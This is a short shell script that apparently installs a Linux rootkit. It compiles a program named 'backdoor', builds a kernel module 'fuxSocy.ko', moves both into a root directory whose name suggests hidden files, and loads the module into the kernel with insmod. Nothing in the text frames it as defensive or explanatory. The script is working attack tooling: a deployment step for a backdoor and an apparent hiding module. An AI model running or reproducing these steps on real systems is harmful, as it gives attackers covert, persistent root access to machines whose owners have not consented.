gcc backdoor.c -o backdoor
make
#mkdir /root/hide_ts_fuxSocy/
mv fuxSocy.ko /root/hide_ts_fuxSocy/
mv backdoor /root/hide_ts_fuxSocy/

insmod /root/hide_ts_fuxSocy/fuxSocy.ko

